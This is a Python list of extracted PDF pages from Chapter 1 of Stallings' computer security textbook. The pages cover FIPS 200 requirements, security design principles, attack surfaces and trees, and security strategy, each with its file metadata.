       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 39, 'page_label': '38'}, page_content='38  CHAPTER 1 / OvERviEw\\nAccess Control: Limit information system access to authorized users, processes acting on behalf of authorized \\nusers, or devices (including other information systems) and to the types of transactions and functions that \\nauthorized users are permitted to exercise.\\nAwareness and Training: (i) Ensure that managers and users of organizational information systems are made \\naware of the security risks associated with their activities and of the applicable laws, regulations, and policies \\nrelated to the security of organizational information systems; and (ii) ensure that personnel are adequately \\ntrained to carry out their assigned information security-related duties and responsibilities.\\nAudit and Accountability: (i) Create, protect, and retain information system audit records to the  \\nextent needed\\xa0to enable the monitoring, analysis, investigation, and reporting of unlawful, unauthorized,  \\nor  inappropriate information system activity; and (ii) ensure that the actions of individual information  \\nsystem users can be uniquely traced to those users so they can be held accountable for their  \\nactions.\\nCertification, Accreditation, and Security Assessments: (i) Periodically assess the security controls in \\n organizational information systems to determine if the controls are effective in their application; (ii) develop \\nand implement plans of action designed to correct deficiencies and reduce or eliminate vulnerabilities in \\n organizational information systems; (iii) authorize the operation of organizational information systems and \\nany associated information system connections; and (iv) monitor information system security controls on an \\nongoing basis to ensure the continued effectiveness of the controls.\\nConfiguration Management: (i) Establish and maintain baseline configurations and inventories of \\n organizational information systems (including hardware, software, firmware, and documentation)  \\nthroughout the respective system development life cycles; and (ii) establish and enforce security  \\nconfiguration settings for information technology products employed in organizational information  \\nsystems.\\nContingency Planning: Establish, maintain, and implement plans for emergency response, backup   \\noperations, and postdisaster recovery for organizational information systems to ensure the availability  \\nof critical  information resources and continuity of operations in emergency situations.\\nIdentification and Authentication: Identify information system users, processes acting on behalf of users, or \\ndevices, and authenticate (or verify) the identities of those users, processes, or devices, as a prerequisite to \\nallowing access to organizational information systems.\\nIncident Response: (i) Establish an operational incident-handling capability for organizational information \\nsystems that includes adequate preparation, detection, analysis, containment, recovery, and user-response \\n activities; and (ii) track, document, and report incidents to appropriate organizational officials and/or \\nauthorities.\\nMaintenance: (i) Perform periodic and timely maintenance on organizational information systems; and \\n(ii)\\xa0provide effective controls on the tools, techniques, mechanisms, and personnel used to conduct  \\ninformation system maintenance.\\nMedia Protection: (i) Protect information system media, both paper and digital; (ii) limit access to information \\non information system media to authorized users; and (iii) sanitize or destroy information system media before \\ndisposal or release for reuse.\\nPhysical and Environmental Protection: (i) Limit physical access to information systems, equipment, and \\nthe respective operating environments to authorized individuals; (ii) protect the physical plant and support \\n infrastructure for information systems; (iii) provide supporting utilities for information systems; (iv) protect \\ninformation systems against environmental hazards; and (v) provide appropriate environmental controls in \\nfacilities containing information systems.\\nPlanning: Develop, document, periodically update, and implement security plans for organizational informa-\\ntion systems that describe the security controls in place or planned for the information systems and the rules \\nof\\xa0behavior for individuals accessing the information systems.\\nTable 1.4 Security Requirements\\n(Continued)\\nM01_STAL0611_04_GE_C01.indd   38 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 40, 'page_label': '39'}, page_content='1.4 / FUNDAMENTAL SECURiTY DESiGN PRiNCiPLES  39\\nto combine technical and managerial approaches to achieve effective computer \\nsecurity.\\nFIPS 200 provides a useful summary of the principal areas of concern, both \\ntechnical and managerial, with respect to computer security. This book attempts to \\ncover all of these areas.\\n 1.4 FUNDAMENTAL SECURITY DESIGN PRINCIPLES\\nDespite years of research and development, it has not been possible to develop secu-\\nrity design and implementation techniques that systematically exclude security flaws \\nand prevent all unauthorized actions. In the absence of such foolproof techniques, it is \\nuseful to have a set of widely agreed design principles that can guide the development \\nof protection mechanisms. The National Centers of Academic Excellence in Infor -\\nmation Assurance/Cyber Defense, which is jointly sponsored by the U.S. National \\nSecurity Agency and the U. S. Department of Homeland Security, list the following \\nas fundamental security design principles [NCAE13]:\\n• Economy of mechanism\\n• Fail-safe defaults\\n• Complete mediation\\n• Open design\\nPersonnel Security: (i) Ensure that individuals occupying positions of responsibility within organizations \\n(including third-party service providers) are trustworthy and meet established security criteria for those \\n positions; (ii) ensure that organizational information and information systems are protected during and after \\npersonnel actions such as terminations and transfers; and (iii) employ formal sanctions for personnel failing to \\ncomply with organizational security policies and procedures.\\nRisk Assessment: Periodically assess the risk to organizational operations (including mission, functions, \\nimage, or reputation), organizational assets, and individuals, resulting from the operation of organizational \\n information systems and the associated processing, storage, or transmission of organizational information.\\nSystems and Services Acquisition: (i) Allocate sufficient resources to adequately protect organizational \\n information systems; (ii) employ system development life cycle processes that incorporate information  security \\nconsiderations; (iii) employ software usage and installation restrictions; and (iv) ensure that third-party \\n providers employ adequate security measures to protect information, applications, and/or services outsourced \\nfrom the organization.\\nSystem and Communications Protection: (i) Monitor, control, and protect organizational communications  \\n(i.e., information transmitted or received by organizational information systems) at the external boundaries \\nand key internal boundaries of the information systems; and (ii) employ architectural designs, software devel-\\nopment techniques, and systems engineering principles that promote effective information security within \\norganizational information systems.\\nSystem and Information Integrity: (i) Identify, report, and correct information and information system flaws \\nin a timely manner; (ii) provide protection from malicious code at appropriate locations within organizational \\ninformation systems; and (iii) monitor information system security alerts and advisories and take appropriate \\nactions in response.\\nSource: Based on FIPS 200\\nM01_STAL0611_04_GE_C01.indd   39 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 41, 'page_label': '40'}, page_content='40  CHAPTER 1 / OvERviEw\\n• Separation of privilege\\n• Least privilege\\n• Least common mechanism\\n• Psychological acceptability\\n• Isolation\\n• Encapsulation\\n• Modularity\\n• Layering\\n• Least astonishment\\nThe first eight listed principles were first proposed in [SALT75] and have with-\\nstood the test of time. In this section, we briefly discuss each principle.\\nEconomy of mechanism  means the design of security measures embodied in \\nboth hardware and software should be as simple and small as possible. The motiva-\\ntion for this principle is that relatively simple, small design is easier to test and verify \\nthoroughly. With a complex design, there are many more opportunities for an adver-\\nsary to discover subtle weaknesses to exploit that may be difficult to spot ahead of \\ntime. The more complex the mechanism is, the more likely it is to  possess  exploitable \\nflaws.  Simple mechanisms tend to have fewer exploitable flaws and require less \\nmaintenance. Furthermore, because configuration management issues are simpli -\\nfied,  updating or replacing a simple mechanism becomes a less intensive process. \\nIn practice, this is perhaps the most difficult principle to honor. There is a constant \\ndemand for new features in both hardware and software, complicating the security \\ndesign task. The best that can be done is to keep this principle in mind during system \\ndesign to try to eliminate unnecessary complexity.\\nFail-safe default means access decisions should be based on permission rather \\nthan exclusion. That is, the default situation is lack of access, and the protection \\nscheme identifies conditions under which access is permitted. This approach exhibits \\na better failure mode than the alternative approach, where the default is to per -\\nmit access. A design or implementation mistake in a mechanism that gives explicit \\npermission tends to fail by refusing permission, a safe situation that can be quickly \\ndetected. On the other hand, a design or implementation mistake in a mechanism that \\nexplicitly excludes access tends to fail by allowing access, a failure that may long go \\nunnoticed in normal use. For example, most file access systems work on this principle \\nand virtually all protected services on client/server systems work this way.\\nComplete mediation means every access must be checked against the access \\ncontrol mechanism. Systems should not rely on access decisions retrieved from \\na\\xa0cache. In a system designed to operate continuously, this principle requires that, if \\naccess decisions are remembered for future use, careful consideration be given to how \\nchanges in authority are propagated into such local memories. File access systems \\nappear to provide an example of a system that complies with this principle. However, \\ntypically, once a user has opened a file, no check is made to see of permissions change. \\nTo fully implement complete mediation, every time a user reads a field or record \\nin a file, or a data item in a database, the system must exercise access control. This \\nresource-intensive approach is rarely used.\\nM01_STAL0611_04_GE_C01.indd   40 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 42, 'page_label': '41'}, page_content='1.4 / FUNDAMENTAL SECURiTY DESiGN PRiNCiPLES  41\\nOpen design means the design of a security mechanism should be open rather \\nthan secret. For example, although encryption keys must be secret, encryption \\n algorithms should be open to public scrutiny. The algorithms can then be reviewed \\nby many experts, and users can therefore have high confidence in them. This is the \\nphilosophy behind the National Institute of Standards and Technology (NIST) pro-\\ngram of standardizing encryption and hash algorithms, and has led to the widespread \\nadoption of NIST-approved algorithms.\\nSeparation of privilege  is defined in [SALT75] as a practice in which  multiple \\nprivilege attributes are required to achieve access to a restricted resource. A good \\nexample of this is multifactor user authentication, which requires the use of mul -\\ntiple techniques, such as a password and a smart card, to authorize a user. The term \\nis also now applied to any technique in which a program is divided into parts that \\nare limited to the specific privileges they require in order to perform a specific \\ntask. This is used to mitigate the potential damage of a computer security attack. \\nOne example of this latter interpretation of the principle is removing high privilege \\noperations to another process and running that process with the higher privileges \\nrequired to perform its tasks. Day-to-day interfaces are executed in a lower privi -\\nleged process.\\nLeast privilege means every process and every user of the system should  operate \\nusing the least set of privileges necessary to perform the task. A good example of the \\nuse of this principle is role-based access control, as will be described in Chapter 4. The \\nsystem security policy can identify and define the various roles of users or processes. \\nEach role is assigned only those permissions needed to perform its functions. Each \\npermission specifies a permitted access to a particular resource (such as read and \\nwrite access to a specified file or directory, and connect access to a given host and \\nport). Unless permission is granted explicitly, the user or process should not be able \\nto access the protected resource. More generally, any access control system should \\nallow each user only the privileges that are authorized for that user. There is also a \\ntemporal aspect to the least privilege principle. For example, system programs or \\nadministrators who have special privileges should have those privileges only when \\nnecessary; when they are doing ordinary activities the privileges should be withdrawn. \\nLeaving them in place just opens the door to accidents.\\nLeast common mechanism  means the design should minimize the functions \\nshared by different users, providing mutual security. This principle helps reduce the \\nnumber of unintended communication paths and reduces the amount of hardware \\nand software on which all users depend, thus making it easier to verify if there are \\nany undesirable security implications.\\nPsychological acceptability  implies the security mechanisms should not \\n interfere unduly with the work of users , and at the same time meet the needs of \\nthose who authorize access. If security mechanisms hinder the usability or acces -\\nsibility of resources, users may opt to turn off those mechanisms. Where possible, \\nsecurity mechanisms should be transparent to the users of the system or at most \\nintroduce minimal obstruction. In addition to not being intrusive or burdensome, \\nsecurity procedures must reflect the user’s mental model of protection. If the pro -\\ntection procedures do not make sense to the user or if the user, must translate his \\nor her image of protection into a substantially different protocol, the user is likely \\nto make errors.\\nM01_STAL0611_04_GE_C01.indd   41 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 43, 'page_label': '42'}, page_content='42  CHAPTER 1 / OvERviEw\\nIsolation is a principle that applies in three contexts. First, public access systems \\nshould be isolated from critical resources (data, processes, etc.) to prevent disclo -\\nsure or tampering. In cases where the sensitivity or criticality of the information is \\nhigh, organizations may want to limit the number of systems on which that data are \\nstored and isolate them, either physically or logically. Physical isolation may include \\nensuring that no physical connection exists between an organization’s public access \\ninformation resources and an organization’s critical information. When implement-\\ning logical isolation solutions, layers of security services and mechanisms should \\nbe established between public systems and secure systems that is responsible for \\n protecting critical resources. Second, the processes and files of individual users should \\nbe isolated from one another except where it is explicitly desired. All modern oper-\\nating systems provide facilities for such isolation, so individual users have separate, \\nisolated process space, memory space, and file space, with protections for preventing \\nunauthorized access. And finally, security mechanisms should be isolated in the sense \\nof preventing access to those mechanisms. For example, logical access control may \\nprovide a means of isolating cryptographic software from other parts of the host \\nsystem and for protecting cryptographic software from tampering and the keys from \\nreplacement or disclosure.\\nEncapsulation can be viewed as a specific form of isolation based on object-\\noriented functionality. Protection is provided by encapsulating a collection of pro -\\ncedures and data objects in a domain of its own so that the internal structure of a \\ndata object is accessible only to the procedures of the protected subsystem and the \\nprocedures may be called only at designated domain entry points.\\nModularity in the context of security refers both to the development of secu -\\nrity functions as separate, protected modules, and to the use of a modular architec -\\nture for mechanism design and implementation. With respect to the use of separate \\nsecurity modules, the design goal here is to provide common security functions  \\nand services, such as cryptographic functions, as common modules. For example, \\nnumerous protocols and applications make use of cryptographic functions. Rather \\nthan implementing such functions in each protocol or application, a more secure \\ndesign is provided by developing a common cryptographic module that can be \\ninvoked by numerous protocols and applications. The design and implementation \\neffort can then focus on the secure design and implementation of a single crypto -\\ngraphic module, including mechanisms to protect the module from tampering. With \\nrespect to the use of a modular architecture, each security mechanism should be \\nable to support migration to new technology or upgrade of new features without \\nrequiring an entire system redesign. The security design should be modular so that \\nindividual parts of the security design can be upgraded without the requirement to \\nmodify the entire system.\\nLayering refers to the use of multiple, overlapping protection approaches \\naddressing the people, technology, and operational aspects of information systems. \\nBy using multiple, overlapping protection approaches, the failure or circumvention \\nof any individual protection approach will not leave the system unprotected. We will \\nsee throughout this book that a layering approach is often used to provide multiple \\nbarriers between an adversary and protected information or services. This technique \\nis often referred to as defense in depth.\\nM01_STAL0611_04_GE_C01.indd   42 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 44, 'page_label': '43'}, page_content='1.5 / ATTACK SURFACES AND ATTACK TREES  43\\nLeast astonishment means a program or user interface should always respond \\nin the way that is least likely to astonish the user. For example, the mechanism for \\nauthorization should be transparent enough to a user that the user has a good intui-\\ntive understanding of how the security goals map to the provided security mechanism.\\n 1.5 ATTACK SURFACES AND ATTACK TREES\\nSection 1.2 provided an overview of the spectrum of security threats and attacks \\nfacing computer and network systems. Section 8.1 will go into more detail about the \\nnature of attacks and the types of adversaries that present security threats. In this \\nsection, we elaborate on two concepts that are useful in evaluating and classifying \\nthreats: attack surfaces and attack trees.\\nAttack Surfaces\\nAn attack surface consists of the reachable and exploitable vulnerabilities in a system \\n[BELL16, MANA11, HOWA03]. Examples of attack surfaces are the following:\\n• Open ports on outward facing Web and other servers, and code listening on \\nthose ports\\n• Services available on the inside of a firewall\\n• Code that processes incoming data,  e-mail, XML, office documents, and \\n industry-specific custom data exchange formats\\n• Interfaces, SQL, and web forms\\n• An employee with access to sensitive information vulnerable to a social engi -\\nneering attack\\nAttack surfaces can be categorized in the following way:\\n• Network attack surface: This category refers to vulnerabilities over an enterprise \\nnetwork, wide-area network, or the Internet. Included in this category are net-\\nwork protocol vulnerabilities, such as those used for a denial-of-service attack, \\ndisruption of communications links, and various forms of intruder attacks.\\n• Software attack surface:  This refers to vulnerabilities in application, utility, \\nor operating system code. A particular focus in this category is Web server \\nsoftware.\\n• Human attack surface: This category refers to vulnerabilities created by person-\\nnel or outsiders, such as social engineering, human error, and trusted insiders.\\nAn attack surface analysis is a useful technique for assessing the scale and \\nseverity of threats to a system. A systematic analysis of points of vulnerability makes \\ndevelopers and security analysts aware of where security mechanisms are required. \\nOnce an attack surface is defined, designers may be able to find ways to make the \\nsurface smaller, thus making the task of the adversary more difficult. The attack sur-\\nface also provides guidance on setting priorities for testing, strengthening security \\nmeasures, or modifying the service or application.\\nM01_STAL0611_04_GE_C01.indd   43 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 45, 'page_label': '44'}, page_content='44  CHAPTER 1 / OvERviEw\\nAs illustrated in Figure 1.4, the use of layering, or defense in depth, and attack \\nsurface reduction complement each other in mitigating security risk.\\nAttack Trees\\nAn attack tree is a branching, hierarchical data structure that represents a set of \\npotential techniques for exploiting security vulnerabilities [MAUW05, MOOR01, \\nSCHN99]. The security incident that is the goal of the attack is represented as the \\nroot node of the tree, and the ways by which an attacker could reach that goal are \\niteratively and incrementally represented as branches and subnodes of the tree. Each \\nsubnode defines a subgoal, and each subgoal may have its own set of further subgoals, \\nand so\\xa0on. The final nodes on the paths outward from the root, that is, the leaf nodes, \\n represent different ways to initiate an attack. Each node other than a leaf is either \\nan AND-node or an OR-node. To achieve the goal represented by an AND-node, \\nthe subgoals represented by all of that node’s subnodes must be achieved; and for \\nan OR-node, at least one of the subgoals must be achieved. Branches can be labeled \\nwith values representing difficulty, cost, or other attack attributes, so that alternative \\nattacks can be compared.\\nThe motivation for the use of attack trees is to effectively exploit the informa-\\ntion available on attack patterns. Organizations such as CERT publish security advi-\\nsories that have enabled the development of a body of knowledge about both general \\nattack strategies and specific attack patterns. Security analysts can use the attack tree \\nto document security attacks in a structured form that reveals key vulnerabilities. The \\nattack tree can guide both the design of systems and applications, and the choice and \\nstrength of countermeasures.\\nFigure 1.4 Defense in Depth and Attack Surface\\nAttack Surface\\nMedium\\nSecurity Risk\\nHigh\\nSecurity Risk\\nLow\\nSecurity Risk\\nDeep\\nLayering\\nShallow\\nSmall Large\\nMedium\\nSecurity Risk\\nM01_STAL0611_04_GE_C01.indd   44 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 46, 'page_label': '45'}, page_content='1.5 / ATTACK SURFACES AND ATTACK TREES  45\\nFigure 1.5, based on a figure in [DIMI07], is an example of an attack tree analysis \\nfor an Internet banking authentication application. The root of the tree is the objective \\nof the attacker, which is to compromise a user’s account. The shaded boxes on the tree \\nare the leaf nodes, which represent events that comprise the attacks. The white boxes \\nare categories which consist of one or more specific attack events (leaf nodes). Note \\nthat in this tree, all the nodes other than leaf nodes are OR-nodes. The analysis used \\nto generate this tree considered the three components involved in authentication:\\n• User terminal and user (UT/U):  These attacks target the user equipment, \\nincluding the tokens that may be involved, such as smartcards or other password \\ngenerators, as well as the actions of the user.\\n• Communications channel (CC): This type of attack focuses on communication \\nlinks.\\n• Internet banking server (IBS): These types of attacks are offline attack against \\nthe servers that host the Internet banking application.\\nFive overall attack strategies can be identified, each of which exploits one or \\nmore of the three components. The five strategies are as follows:\\nFigure 1.5 An Attack Tree for Internet Banking Authentication\\nBank Account Compromise\\nUser credential compromise\\nUser credential guessing\\nUT/U1a User surveillance\\nUT/U1b Theft of token and\\nhandwritten notes\\nMalicious software\\ninstallation Vulnerability exploit\\nUT/U2a Hidden code\\nUT/U2b Worms\\nUT/U3a Smartcard analyzers\\nUT/U2c E-mails with\\nmalicious code\\nUT/U3b Smartcard reader\\nmanipulator\\nUT/U3c Brute force attacks\\nwith PIN calculators\\nCC2 Sniﬃng\\nUT/U4a Social engineering\\nIBS3 Web site manipulation\\nUT/U4b Web page\\nobfuscation\\nCC1 Pharming\\nRedirection of\\ncommunication toward\\nfraudulent site\\nCC3 Active man-in-the\\nmiddle attacks\\nIBS1 Brute force attacks\\nUser communication\\nwith attacker\\nInjection of commands\\nUse of known authenticated\\nsession by attacker\\nNormal user authentication\\nwith speciﬁed session ID\\nCC4 Pre-deﬁned session\\nIDs (session hijacking)\\nIBS2 Security policy\\nviolation\\nM01_STAL0611_04_GE_C01.indd   45 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 47, 'page_label': '46'}, page_content='46  CHAPTER 1 / OvERviEw\\n• User credential compromise: This strategy can be used against many elements \\nof the attack surface. There are procedural attacks, such as monitoring a user’s \\naction to observe a PIN or other credential, or theft of the user’s token or \\nhandwritten notes. An adversary may also compromise token information using \\na variety of token attack tools, such as hacking the smartcard or using a brute \\nforce approach to guess the PIN. Another possible strategy is to embed mali -\\ncious software to compromise the user’s login and password. An adversary may \\nalso attempt to obtain credential information via the communication channel \\n(sniffing). Finally, an adversary may use various means to engage in communica-\\ntion with the target user, as shown in Figure 1.5.\\n• Injection of commands: In this type of attack, the attacker is able to intercept \\ncommunication between the UT and the IBS. Various schemes can be used to \\nbe able to impersonate the valid user and so gain access to the banking system.\\n• User credential guessing:  It is reported in [HILT06] that brute force \\nattacks against some banking authentication schemes are feasible by send -\\ning  random usernames and passwor ds. The attack mechanism is based on \\ndistributed  zombie personal computers, hosting automated programs for  \\nusername- or password-based calculation.\\n• Security policy violation:  For example, violating the bank’s security policy in \\ncombination with weak access control and logging mechanisms, an employee \\nmay cause an internal security incident and expose a customer’s account.\\n• Use of known authenticated session: This type of attack persuades or forces the \\nuser to connect to the IBS with a preset session ID. Once the user authenticates \\nto the server, the attacker may utilize the known session ID to send packets to \\nthe IBS, spoofing the user’s identity.\\nFigure 1.5 provides a thorough view of the different types of attacks on an Inter-\\nnet banking authentication application. Using this tree as a starting point, security \\nanalysts can assess the risk of each attack and, using the design principles outlined in \\nthe preceding section, design a comprehensive security facility. [DIMO07] provides \\na good account of the results of this design effort.\\n 1.6 COMPUTER SECURITY STRATEGY\\nWe conclude this chapter with a brief look at the overall strategy for providing com-\\nputer security. [LAMP04] suggests that a comprehensive security strategy involves \\nthree aspects:\\n• Specification/policy: What is the security scheme supposed to do?\\n• Implementation/mechanisms: How does it do it?\\n• Correctness/assurance: Does it really work?\\nSecurity Policy\\nThe first step in devising security services and mechanisms is to develop a security \\npolicy. Those involved with computer security use the term security policy in vari -\\nous ways. At the least, a security policy is an informal description of desired system \\nM01_STAL0611_04_GE_C01.indd   46 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 48, 'page_label': '47'}, page_content='1.6 / COMPUTER SECURiTY STRATEGY  47\\nbehavior [NRC91]. Such informal policies may reference requirements for security, \\nintegrity, and availability. More usefully, a security policy is a formal statement of \\nrules and practices that specify or regulate how a system or organization provides \\nsecurity services to protect sensitive and critical system resources (RFC 4949). Such a \\nformal security policy lends itself to being enforced by the system’s technical controls \\nas well as its management and operational controls.\\nIn developing a security policy, a security manager needs to consider the \\n following factors:\\n• The value of the assets being protected\\n• The vulnerabilities of the system\\n• Potential threats and the likelihood of attacks\\nFurther, the manager must consider the following trade-offs:\\n• Ease of use versus security: Virtually all security measures involve some  penalty \\nin the area of ease of use. The following are some examples: Access control \\nmechanisms require users to remember passwords and perhaps perform other \\naccess control actions. Firewalls and other network security measures may \\nreduce available transmission capacity or slow response time. Virus-checking \\nsoftware reduces available processing power and introduces the possibility of \\nsystem crashes or malfunctions due to improper interaction between the secu-\\nrity software and the operating system.\\n• Cost of security versus cost of failur e and recovery: In addition to ease of use \\nand performance costs, there are direct monetary costs in  implementing and \\nmaintaining security measures. All of these costs must be balanced against \\nthe cost of security failure and recovery if certain security measures are \\n lacking. The cost of security failure and recovery must take into account not \\nonly the value of the assets being protected and the damages resulting from \\na security violation, but also the risk, which is the probability that\\xa0a particu -\\nlar threat will exploit a particular vulnerability with a particular harmful \\nresult.\\nSecurity policy is thus a business decision, possibly influenced by legal \\nrequirements.\\nSecurity Implementation\\nSecurity implementation involves four complementary courses of action:\\n• Prevention: An ideal security scheme is one in which no attack is successful. \\nAlthough this is not practical in all cases, there is a wide range of threats in \\nwhich prevention is a reasonable goal. For example, consider the transmission \\nof encrypted data. If a secure encryption algorithm is used, and if measures \\nare in place to prevent unauthorized access to encryption keys, then attacks on \\nconfidentiality of the transmitted data will be prevented.\\n• Detection: In a number of cases, absolute protection is not feasible, but it is \\npractical to detect security attacks. For example, there are intrusion detection \\nsystems designed to detect the presence of unauthorized individuals logged \\nonto a system. Another example is detection of a denial of service attack, \\nM01_STAL0611_04_GE_C01.indd   47 10/10/17   9:22 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 49, 'page_label': '48'}, page_content='48  CHAPTER 1 / OvERviEw\\nin which communications or processing resources are consumed so they are \\nunavailable to legitimate users.\\n• Response: If security mechanisms detect an ongoing attack, such as a denial of \\nservice attack, the system may be able to respond in such a way as to halt the \\nattack and prevent further damage.\\n• Recovery: An example of recovery is the use of backup systems, so if data \\n integrity is compromised, a prior, correct copy of the data can be reloaded.\\nAssurance and Evaluation\\nThose who are “consumers” of computer security services and mechanisms (e.g., sys-\\ntem managers, vendors, customers, and end users) desire a belief that the security \\nmeasures in place work as intended. That is, security consumers want to feel that the \\nsecurity infrastructure of their systems meet security requirements and enforce secu-\\nrity policies. These considerations bring us to the concepts of assurance and evaluation.\\nAssurance is an attribute of an information system that provides grounds for \\nhaving confidence that the system operates such that the system’s security policy is \\nenforced. This encompasses both system design and system implementation. Thus, \\nassurance deals with the questions, “Does the security system design meet its require-\\nments?” and “Does the security system implementation meet its specifications?” \\nAssurance is expressed as a degree of confidence, not in terms of a formal proof that \\na design or implementation is correct. The state of the art in proving designs and \\nimplementations is such that it is not possible to provide absolute proof. Much work \\nhas been done in developing formal models that define requirements and character-\\nize designs and implementations, together with logical and mathematical techniques \\nfor addressing these issues. But assurance is still a matter of degree.\\nEvaluation is the process of examining a computer product or system with respect \\nto certain criteria. Evaluation involves testing and may also involve formal analytic or \\nmathematical techniques. The central thrust of work in this area is the development of \\nevaluation criteria that can be applied to any security system (encompassing security ser-\\nvices and mechanisms) and that are broadly supported for making product comparisons.\\n 1.7 STANDARDS\\nMany of the security techniques and applications described in this book have been \\nspecified as standards. Additionally, standards have been developed to cover man -\\nagement practices and the overall architecture of security mechanisms and services. \\nThroughout this book, we will describe the most important standards in use or that \\nare being developed for various aspects of computer security. Various organizations \\nhave been involved in the development or promotion of these standards. The most \\nimportant (in the current context) of these organizations are as follows:\\n• National Institute of Standards and Technology: NIST is a U.S. federal agency \\nthat deals with measurement science, standards, and technology related to U.S. \\ngovernment use and to the promotion of U.S. private sector innovation. Despite \\nits national scope, NIST Federal Information Processing Standards (FIPS) and \\nSpecial Publications (SP) have a worldwide impact.\\nM01_STAL0611_04_GE_C01.indd   48 10/10/17   9:22 PM'),\n",
